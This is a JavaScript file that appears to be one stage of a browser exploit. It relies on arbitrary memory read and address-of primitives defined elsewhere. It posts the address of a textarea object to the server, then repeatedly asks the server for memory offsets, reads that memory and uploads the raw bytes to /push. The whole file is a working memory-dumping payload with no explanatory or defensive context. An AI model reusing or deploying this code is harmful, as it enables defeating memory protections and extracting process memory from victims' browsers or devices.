function query()
{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/pull', true);
    xhr.onerror = query.bind(window);
    xhr.onload = function()
    {
        try
        {
            try
            {
                var data = JSON.parse(xhr.responseText);
            }
            catch(e)
            {
                return query();
            }
            if(data !== null)
            {
                var m = read_mem_b(data.offset, data.size);
                var xhr2 = new XMLHttpRequest();
                xhr2.open('POST', '/push', false);
                xhr2.send(m);
            }
        }
        catch(e)
        {
            document.body.innerHTML += e;
        }
        query();
    }
    xhr.send('');
}

function leak(obj)
{
    var addr = addrof(obj);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/leak', true);
    xhr.send(hex(addr));
}

try
{
    var tarea = document.createElement('textarea');
    leak(tarea);
    query();
}
catch(e)
{
    alert(e);
}
